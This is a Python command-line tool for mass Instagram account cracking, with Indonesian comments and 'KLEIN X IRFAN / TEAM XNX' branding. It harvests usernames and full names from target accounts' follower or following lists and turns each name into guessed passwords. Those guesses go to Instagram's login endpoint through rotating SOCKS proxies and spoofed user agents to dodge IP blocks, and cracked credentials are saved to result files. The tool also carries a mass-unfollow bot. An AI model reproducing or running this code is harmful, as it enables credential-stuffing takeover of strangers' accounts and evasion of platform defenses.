

try:
    import json
    import uuid
    import hmac
    import random
    import hashlib
    import urllib
    import stdiomask
    import urllib.request
    import calendar
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re,subprocess
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Install  (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
from time import sleep as jeda
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
try:
    os.mkdir('result')
except:
    pass
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('GAGAL')
prox=open('.prox.txt','r').read().splitlines()
try:
	os.system('curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt -o socks5.txt')
except:
	pass
sock=open('socks5.txt','r').read().splitlines()
CY='\033[96;1m'
MG='\033[1;35m' #MAGENTA
H='\033[1;32m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
ses = requests.Session()
B = '\33[1;96m' # BIRU -
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
R = '\033[91;1m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
BN = '\x1b[1;107m' # BELAKANG PUTIH
USN="Mozilla/5.0 (Linux; Android 11; ASUS_I006D Build/RKQ1.201022.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 Sleipnir/3.5.28 Instagram 213.1.0.22.117 (iPhone13,2; iOS 15_0_2; en_US; en-US; scale=3.00; 1170x2532; 332048479)"
# USN="Mozilla/5.0 (Linux; Android 11; ASUS_I006D Build/RKQ1.201022.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 Sleipnir/3.5.28"
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
s=requests.Session()
ua=open('ua.txt','r').read().splitlines()

 
try:
	os.system('clear')
	xnx = ses.get('https://pastebin.com/raw/ad0jb6Tc').text
	if "maintenance" in xnx:
		os.system('clear')
		print('tool is under maintenance break')
		sys.exit()
	if "off" in xnx:
		print('Tool is Currenty Off')
		sys.exit()
	if "update" in xnx:
		print('Tool is updating..... Wait For Complete The Update')
		sys.exit()
	if "server" in xnx:
		print('server is closed')
		sys.exit()
except requests.exceptions.ConnectionError:
	prints(Panel(f"""{P2}connection problem, please check your connection again""",width=80,style=f"{color_table}"))
	sys.exit()



# CLEAR
def clear():
    os.system('clear')
    
# CLEAR
def clear():
	os.system('clear')
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
		
# BANNER
def banner():
	clear()
	au=f"""
\t      __ __ __    ___________   __     __________
\t     / //_// /   / ____/  _/ | / /____/  _/ ____/
\t    / ,<  / /   / __/  / //  |/ /____// // / __ 
\t   / /| |/ /___/ /____/ // /|  /____// // /_/ /  
\t  /_/ |_/_____/_____/___/_/ |_/    /___/\____/   
      [•]KLEIN X IRFAN 
      [•]FB=AHMED ALI / ETHAN EDWARD KLEIN
      [•]TEAM XNX
      [•]PREMIUM
"""
	sol().print(nel(au,style='',title='───────────────────'))

# CEK API COOKIES
def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        print(f'\t {M}Instagram Checkpoint')
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()
    return external,user
    
# UNTUK LOGIN IG
def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            print('')
            wel = 'LOGIN PLEASE '
            wel2 = mark(wel, style='cyan')
            sol().print(wel2)
            cetak(nel(f'>> 1. LOGIN  WITH COOKIE '))
            loginpil=input(f">> choose:{C} ")
            if loginpil=='1':
                wel = ' DO NOT USE YOUR PERSONAL ACCOUNT FOR LOGIN !'
                wel2 = mark(wel, style='cyan')
                sol().print(wel2)
                us=input(f'>>  USERNAME OF ACCOUNT :{C}')
                cok=input(f'>>  COOLIE  :{C}')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us)
                os.system('python ig2.py')
            elif loginpil == 'iebfisncneocnwodnf':
                login()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        login()
  
# LOGIN USERNAME & PASSWOARD      
def logibnxidncnn():
    global external
    try:
        wel = '# Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
        wel2 = mark(wel, style='cyan')
        sol().print(wel2)
        us=input(f"{MG} Masukan username: {C}")
        pw=stdiomask.getpass(prompt=f'{CY} Masukan password: {C}')
    except KeyboardInterrupt:
        wel = '# KeyboardInterrupt terdeteksi... keluar !'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        exit()
    x=instagramAPI(us,pw).loginAPI()
    if x.get('status')=='success':
        open('.username','a').write(us)
        open('.kukis.log','a').write(x.get('cookie'))
        cookie={'cookie':x.get('cookie')}
        print(f'\n{H}>{C} Login berhasil')
        os.system('python ige.py')
    elif x.get('status')=='checkpoint':
        print(f'akun check point')
        login()
    else:
        print(f'username atau paswoard salah')
        login()
        
class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
        self.s=requests.Session()
    def logo(self):
        for i in external:
            try:
                nama=i.split('|')[0]
                followers=i.split('|')[1]
                following=i.split('|')[2]
            except:
                pass
            banner()
            oi = '\t              [green]%s'%(nama)
            cetak(nel(oi, title='LOGIN SUCCESSFUL'))
            ou='[white][[cyan]01[white]] CRACK FROM PUBLIC INSTA USERNAME\n[[red]Ee[white]] [red]Logout'
            cetak(nel(ou, title=' CHOOSE'))
            
# HAPUS COOKIES 
    def Exit(self):
        print('')
        print(f'>> DO YOU WANT TO LOG OUT  <<')
        x=input(f'\n>> CHOOSE y/t : {C}')
        if x in ('y','Y'):
            os.remove('.kukis.log')
            os.remove('.username')
            os.system('python ig2.py')
        elif x in ('t','T'):
            os.system('python ig2.py')
        else:
            self.Exit()

# SIX API BUAT COLI            
    def sixAPI(self,six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3613812772602163&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str( x_jason['users'][0].get("user").get("pk") )
        return uid
        
# UNFOLLOW UNTUK LO BABI        
    def unfollowAPI(self,user_id,username_id,cookie):
        uuid=generateUUID(True)
        xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
        s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': User_Agent()})
        data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})
        self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
            self.generateUUID(False),
            urllib.request.quote(data))
        return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text
  
# UNTUK PENCARIAN      
    def searchAPI(self,cookie,nama):
        try:
            x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rrank_token=0.35875757839675004&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
            x_jason=json.loads(x.text)
            for i in x_jason['users']:
                user=i['user']
                username=user['username']
                fullname=user['full_name']
                internal.append(f'{username}|{fullname}')
        except requests.exceptions.ConnectionError:
            exit(f'\n [{M}!{C}] INTERNET CONNECTION ERROR')
        return internal
        
# UNTUK MENGUMPULKN ID
    def idAPI(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
                m_jason=m.json()["data"]["user"]
                idx=m_jason["id"]
            except requests.exceptions.ConnectionError:
                exit(f"\n{M}[!] INTERNET CONNECTION ERROR{C}")
            except Exception as e:
                exit(f"\n{M}[!] ID NOT PUBLIC OR TOLEN EXPIRED {C}")
            return idx
        else:lisensi()
        
# UNTUK SAYANG KU HAHAH
    def infoAPI(self,cookie,api,id):
        if 'sukses' in  lisensiku:
            try:
                print('│')
                print(f'├──[ PLEASE WAIT COLLECTING IDS...')
                x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
                x_jason=json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'pengikut' in menudump:
                    maxid=x_jason['next_max_id']
                    for z in range (9999):
                        x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
                        x_jason=json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:                                 maxid=x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:pass
            except requests.exceptions.ConnectionError:
                exit(f'\n>> INTERNET CONNECTION ERROR{C}')
            except Exception as e:
                print(f'├──[ Username not public or token expired {C}')
            return internal
        else:lisensi()
        
    def passwordAPI(self,xnx):
        print(f'└──[ Total Id : {H}{len(internal)}{N} ')
        pilpass='# CHOOSE PASSWORD '
        pilpass1=mark(pilpass,style='green')
        sol().print(pilpass1)
        cetak(nel('[1] FirstName123 Firstname1234\n[2] FirtsName123 Firstname1234 Firstname12345 FullName\n[3] FirstName+123,FullName,Full Name\n[4] Password Manual'))
        c=input(f'>> CHOOSE : {N}')
        if c=='1':
            self.generateAPI(xnx,c)
        elif c=='2':
            self.generateAPI(xnx,c)
        elif c=='3':
            self.generateAPI(xnx,c)
        elif c=='7':
            self.generateAPI(xnx,c)
        elif c=='4':
            print(f'paswoard manual')
            print(f'{M} Example = klein,password,Bangladesh,ETC')
            print('')
            zx=input(f'>> List Password : {H} {N}')
            self.generateAPI(xnx,c,zx)
        else:
            self.passwordAPI(xnx)
            
            
            
     # BENTAR LAGI PERANG
    def generateAPI(self,user,o,zx=''):
        yu = f'[•] OK ID WILL BE SAVED IN  : result {day}.txt\n[•] CP ID WILL BE SAVED IN : result {day}.txt\nON OFF AIRPLANE MODE AFTER EVERY 500 CRACK'
        cetak(nel(yu, title='CRACK'))    
        with ThreadPoolExecutor(max_workers=15) as shinkai:
            for i in user:
                try:
                    username=i.split("|")[0]
                    password=i.split("|")[1].lower()
                    for w in password.split(" "):
                        if len(w)<3:
                            continue
                        else:
                            w=w.lower()
                            if o=="1":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234']
                                else:
                                    sandi=[w]
                            elif o=="2":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                                else:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                            elif o=="3":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,password.lower()]
                                else:
                                    sandi=[w+'123',w,password.lower()]
                            elif o=="7":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234',w+'12345',w]
                                else:
                                    sandi=[w+'123',w+'1234',w+'12345',password.lower()]
                            elif o=="4":
                                if len(zx) > 3:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    break
                            shinkai.submit(self.crackAPI,username,sandi)
                except:
                    pass
        print('\n')
        print(f'>> Crack FAILED ')
        exit()
        
            
            
# BENTAR LAGI PERANG
    def generateHWJEWNDODBAPI(JSself,user,o,zx=''):
        yu = f'[•] OK ID WILL BE SAVED IN  : result {day}.txt\n[•] CP ID WILL BE SAVED IN : result {day}.txt\nON OFF AIRPLANE MODE AFTER EVERY 500 CRACK'
        cetak(nel(yu, title='CRACK'))    
        with ThreadPoolExecutor(max_workers=15) as shinkai:
            for i in user:
                try:
                    username=i.split("|")[0]
                    password=i.split("|")[1].lower()
                    for w in password.split(" "):
                        if len(w)<3:
                            continue
                        else:
                            w=w.lower()
                            if o=="1":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w,w+'123',w+'1234']
                                else:
                                    sandi=[w]
                            elif o=="2":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w,w+'123',w+'1234',w+'12345']
                                else:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                            elif o=="3":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w,w+'123',w+'1234',w+'12345',w+'123456',password.lower()]
                                else:
                                    sandi=[w+'123',w,password.lower()]
                            elif o=="7":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234',w+'12345',w]
                                else:
                                    sandi=[w+'123',w+'1234',w+'12345',password.lower()]
                            elif o=="4":
                                if len(zx) > 3:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    break
                            shinkai.submit(self.crackAPI,username,sandi)
                except:
                    pass
        print('\n')
        print(f'>> Crack FAILED BYE ')
        exit()
        
# MULAI PERANG
    def APIinfo(self,user):
        try:
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            pass
            
        return nama,pengikut,mengikut,postingan
        
# PERANG NYA SERU
    def crackAPI(self,user,pas):
        global loop,success,checkpoint
        animasi = random.choice(["[KLEIN]"])
        bo=random.choice([CY,H,M,K])
        sys.stdout.write(f"\r{animasi} {P}[{bo}{loop}{P}/{bo}{len(internal)}{P}] {P}[{H}OK : {len(success)}{P}]{N}  {P}[{M}CP : {len(checkpoint)}{P}] {bo}{'{:.0%}'.format(loop/float(len(internal)))}{N}  "),sys.stdout.flush()
        try:
            for pw in pas:
                ts = calendar.timegm(current_GMT)
                nip=random.choice(sock)
                proxs= {'http': 'socks5://'+nip}
                aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
                b=random.choice(['4','5','6','7','8','9','10','11','12'])
                c='ASUS_I006D Build/RKQ1.201022.002'
                d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                e=random.randrange(1, 999)
                f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
                h=random.randrange(73,100)
                i='0'
                j=random.randrange(4200,4900)
                k=random.randrange(40,150)
                l='Mobile Safari/537.36 Sleipnir/3.5.28'
                uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                token=s.get('https://www.instagram.com/accounts/login/?next=/accounts/logout/')
                headers = {
                    'Host': 'www.instagram.com',
                    'connenction': 'keep-alive',
                    'x-ig-www-claim': '0',
                    'x-instagram-ajax': '57ac339ce6f4',
                    'content-type': 'application/x-www-form-urlencoded',
                    'accept': '*/*',
                    'x-requested-with': 'XMLHttpRequest',
                    'x-asbd-id': '198387',
                    'user-agent': uaku,
                    'x-csrftoken': token.cookies['csrftoken'],
                    'x-ig-app-id': '1217981644879628',
                    'origin': 'https://www.instagram.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.instagram.com/accounts/login/?next=/accounts/logout/',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'

                }
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                param={
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "queryParams": "{}",
                    "optIntoOneTap": 'false',
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
                if "userId" in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    print(f"\r{B}[{P}✔{B}]{P} Status :{H} SUCCESS-KLEIN x XNX{C}                    ")
                    print(f"{B}[{P}•{B}]{P} NAME     : {H}{nama}\n{B}[{P}•{B}]{P} Username : {H}{user}\n{B}[{P}•{B}]{P} Password : {H}{pw}\n{B}[{P}•{B}]{P} FOLLOWER : {H}{pengikut}\n{B}[{P}•{B}]{P} FOLLOWING: {H}{mengikut}\n{B}[{P}•{B}]{P} POST: {H}{postingan}{C}")
                    print('\n')
                    open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    success.append(user)
                    break
                elif 'checkpoint_url' in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
              #      print(f"\r{H}[{R}✘{H}]{H} Status :{R} Check Point{R}                    ")
                    print(f"\r{B}[{P}✘{B}]{P} Status :{K} Check Point{C}                    ")
                    print(f"{B}[{P}•{B}]{P} NAME     : {K}{nama}\n{B}[{P}•{B}]{P} Username : {K}{user}\n{B}[{P}•{B}]{P} Password : {K}{pw}\n{B}[{P}•{B}]{P} FOLLOWER : {K}{pengikut}\n{B}[{P}•{B}]{P} FOLLOWING: {K}{mengikut}\n{B}[{P}•{B}]{P} POST: {K}{postingan}{C}") 
          #          print(f"{H}[{R}√{H}]{P} NAME     : {R}{nama}\n{B}[{P}•{B}]{P} Username : {R}{user}\n{B}[{P}•{B}]{P} Password : {R}{pw}\n{B}[{P}•{B}]{P} FOLLOWER : {R}{pengikut}\n{B}[{P}•{B}]{P} FOLLOWING: {R}{mengikut}\n{B}[{P}•{B}]{P} POST: {R}{postingan}{C}") 
                    print('\n')
                    open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    checkpoint.append(user)
                    break
                elif 'Please wait a few minutes' in str(x.text):
                    sys.stdout.write(f"\r[{U}!{C}] {U}IP BLOCKED {C}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
                elif 'ip_block' in str(x.text):
                    sys.stdout.write(f"\r[{U}!{C}] {U}IP BLOCKED {C}");sys.stdout.flush();sleep(0)
                    self.crackAPI(user,pas)
                elif 'spam' in str(x.text):
                    sys.stdout.write(f"\r[{U}!{C}] {U}IP BLOCKED {C}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
                else:
                    continue
            loop+=1
        except:
            self.crackAPI(user,pas)

# PERANG KE DUA
    def checkAPI(self,user,pw):
        try:
            token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
            crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
            s.headers.update({
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR02SLJcxjyCDDqlFL3FP1-1-NvJP5G0V3dVgiT0y_FZm-lV',
                'x-instagram-ajax': '1005710756',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': uap,
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': crf_token,
                'x-ig-app-id': '936619743392459',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-US,en;q=0.9'

            })
            param={
                "username": user,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                "optIntoOneTap": False,
                "queryParams": {},
                "stopDeletionNonce": "",
                "trustedDeviceRecords": {}
            }
            x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
            x_jason=json.loads(x.text)
            if "userId" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                print(f"\r{B}[{P}✔{B}]{P} Status :{H} SUCCESS-KLEIN x XNX{C}                    ")
                print(f"{B}[{P}•{B}]{P} NAME     : {H}{nama}\n{B}[{P}•{B}]{P} Username : {H}{user}\n{B}[{P}•{B}]{P} Password : {H}{pw}\n{B}[{P}•{B}]{P} FOLLOWER : {H}{pengikut}\n{B}[{P}•{B}]{P} FOLLOWING: {H}{mengikut}\n{B}[{P}•{B}]{P} POST: {H}{postingan}{C}")
                print('\n')
            elif 'checkpoint_url' in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                print(f"\r{B}[{P}✘{B}]{P} Status :{K} Check Point{C}                    ")
                print(f"{B}[{P}•{B}]{P} NAME     : {K}{nama}\n{B}[{P}•{B}]{P} Username : {K}{user}\n{B}[{P}•{B}]{P} Password : {K}{pw}\n{B}[{P}•{B}]{P} FOLLOWER : {K}{pengikut}\n{B}[{P}•{B}]{P} FOLLOWING: {K}{mengikut}\n{B}[{P}•{B}]{P} POST: {K}{postingan}{C}") 
                print('\n')
            elif 'Please wait a few minutes' in str(x.text):
                sys.stdout.write(f"\r [{U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
                self.checkAPI(user,pw)
        except:
            self.checkAPI(user,pw)
            
# PILIHAN MENU
    def menu(self):
        self.logo()
        c=input(f'>> CHOOSE :{C}  ')
        if c=='':
            self.menu()
        elif c in ('ISJCNDND1','0JSNCJDNCN1'):
            print('Masukan jumlah target')
            m=int(input(f'\n{MG}>> Jumlah : {C}'));print('')
            print('# Masukan nama ranfom untuk di searching')
            for i in range(m):
                i+1
                nama=input(f'{CY}>> Masukan nama ({H}{len(internal)}{C}): ')
                name=self.searchAPI(self.cookie,nama)
            self.passwordAPI(name)
        elif c in ('1','01'):
            print('')
            mas=input(f'>> for multi brute press y | and for single t? y/t{C} ')
            if mas in ['y','Y']:
                masal(self)
            elif mas in ['t','T']:
                massal(self)
            elif mas in ['']:
                print('ISI JANGAN KOSONG KENTOD!')
        elif c in ('382949293','03929493029'):
            print('')
            mas=input('>> DO YOU WANT TO DO MUKTI CRACK ? y/t ')
            if mas in ['y','Y']:
                mengi(self)
            elif mas in ['t','T']:
                meng(self)
            elif mas in ['']:
                print('ISI JANGAN KOSONG KENTOD!')
        elif c in ('42829204030','0828492924'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {CY}>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            print(f'\n>> Total Result MASTER{H}{len(g)}{C}')
            print(f'\n{CY}[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                self.checkAPI(usr,pwd)
            exit(f'\n{K} proses check selesai...{C}')
        elif c in ('5839292939','0572829292'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'\n {U}>> Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f'\n{K}[>] Total result yang di temukan [{H}{len(g)}{C}]')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="checkpoint":
                    print(f"""
 [{M}+{C}] {M}CHACK POINT{C}:
  {M}├╴>{C} Username: {O}{usr}{C}
  {M}├╴>{C} Password: {O}{pwd}{C}
  {M}├╴>{C} Followers: {O}{fol}{C}
  {M}├╴>{C} Following: {O}{ful}{C}
                    """);sleep(0.05)
                else:
                    print(f"""
  {H}[>]{C}{H} AKUN LIVE {C}
  {H}[>]{C}{H} Username : {H}{usr}{C}
  {H}[>]{C}{H} Password : {H}{pwd}{C}
  {H}[>]{C}{H} Pengikut : {H}{fol}{C}
  {H}[>]{C}{H} Mengikuti : {H}{ful}{C}

                    """);sleep(0.05)
        elif c in ('682910494818','0829201026'):
            global following
            six=0
            print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
            x=open('.kukis.log','r').read()
            x_id=re.findall('sessionid=(\d+)',x)[0]
            back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
            for i in following:
                six+=1
                sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
                six_id=self.sixAPI(i)
                print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
                self.unfollowAPI(six_id,'5452333948',self.cookie)
                #print(w)
            input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()
        elif c in ('7282929r','R829292'):
            self.BUG()
        elif c in ('829292c','828292C'):
            self.ChangeLog()
        elif c in ('e','E'):
            self.Exit()
        else:
            self.menu()
            
def mengi(self):
            try:
                menudump.append('pengikut')
                cetak(nel(' ENTER AMOUNT OF IDS YOU WANT TO DUMP '))
                m=int(input(f'\n{H}[?{H}]  IDS: {N}'))
            except:m=1
            for t in range(m):
                t +=1
                print(f'└── Total Id :{len(internal)}')
                nama=input(f' [{t}] Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
            self.passwordAPI(info)

def meng(self):
    print(' ENTER PUBLIC ID ')
    m=input(f'{CY}├──[ Username target : {C}')
    id=self.idAPI(self.cookie,m)
    info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
    self.passwordAPI(info)

def masal(self):
            try:
                menudump.append('pengikut')
                cetak(nel(' ENTER AMOUNT OF IDS'))
                m=int(input(f'\n├──[ CHOOSE : {N}'))
            except:m=1
            for t in range(m):
                t +=1
                print('│')
                nama=input(f'├──[ Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)

def massal(self):
            menudump.append('pengikut')
            cetak(nel(' ENTER PUBLIC ID '))
            m=input(f'├──[ Username target : {C}')
            id=self.idAPI(self.cookie,m)
            info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)

def mengecek_():
    try:
           os.system('git pull');os.system('clear')
           cek = open ("Kuy.txt","r").read()
    except (KeyError,IOError):
           os.system('clear');print(' %s[%s×%s] Data lisensi kadarluarsa'%(N,M,N));jeda(3)
           konfirmasi()
    if os.path.exists('Kuy.txt'):
           try:
                   cek = open('Kuy.txt', 'r').read()
                   lis = requests.get("https://github.com/Jail-XD/coklat/blob/main/kuy.txt").text.strip()
                   if cek in lis:
                          os.system('clear');banner()
                          jalan(' %s[%s✓%s] Lisensi kamu sudah aktif √'%(N,H,N));jeda(2);login()
                   else:
                          os.system('clear');banner()
                          jalan(' %s[%s×%s] Licensi kamu tidak aktif'%(N,M,N));jeda(2);os.system('rm -rf Kuy.txt');konfirmasi()
           except IOError:
                   konfirmasi()
    else:
           konfirmasi()

if __name__=='__main__':
    try:
        os.system('git pull')
        os.system('curl -l https://raw.githubusercontent.com/Tenking-XD/IGD/main/ua.txt > ua.txt')
        #mengecek_()
        login_kamu()
    except requests.exceptions.ConnectionError:
        exit(f'\n [{M}!{C}] INTERNET CONNECTION ERROR')
